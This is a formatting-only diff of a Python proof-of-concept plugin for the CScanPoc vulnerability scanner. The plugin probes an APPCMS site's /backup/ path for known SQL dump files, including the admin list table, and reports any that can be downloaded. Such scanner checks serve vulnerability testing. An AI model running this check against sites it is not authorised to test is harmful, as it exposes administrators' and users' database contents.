@@ -1,21 +1,22 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'APPCMS_0000' # 平台漏洞编号，留空
-    name = 'APPCMS设计权限备份数据库可直接下载' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    vuln_id = 'APPCMS_0000'  # 平台漏洞编号，留空
+    name = 'APPCMS设计权限备份数据库可直接下载'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-12-20'  # 漏洞公布时间
     desc = '''
         APPCMS设计权限备份数据库可直接下载
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=077157
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=077157
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'APPCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -23,7 +24,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = '024c3e83-69ba-41e9-aa3e-7b801d2aa9c7'
     author = '国光'  # POC编写者
-    create_date = '2018-05-15' # POC创建时间
+    create_date = '2018-05-15'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -35,11 +36,13 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             payload = "/backup/"
             url = arg + payload
-            sqlFile = ['appcms_admin_list_0.sql', 'appcms_app_history_0.sql', 'appcms_app_list_0.sql', 'appcms_cate_relation_0.sql', 'appcms_category_0.sql', 'appcms_flink_0.sql', 'appcms_info_list_0.sql', 'appcms_recommend_area_0.sql', 'appcms_resource_list_0.sql', 'appcms_url_rewrite_0.sql']
+            sqlFile = ['appcms_admin_list_0.sql', 'appcms_app_history_0.sql', 'appcms_app_list_0.sql', 'appcms_cate_relation_0.sql', 'appcms_category_0.sql',
+                       'appcms_flink_0.sql', 'appcms_info_list_0.sql', 'appcms_recommend_area_0.sql', 'appcms_resource_list_0.sql', 'appcms_url_rewrite_0.sql']
             for f in sqlFile:
-                code, head, res, errcode,finalurl = hh.http(url+f)
+                code, head, res, errcode, finalurl = hh.http(url+f)
                 if code == 200 and "sql" in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞, url={url}'.format(target=self.target,name=self.vuln.name,url=url))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞, url={url}'.format(
+                        target=self.target, name=self.vuln.name, url=url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
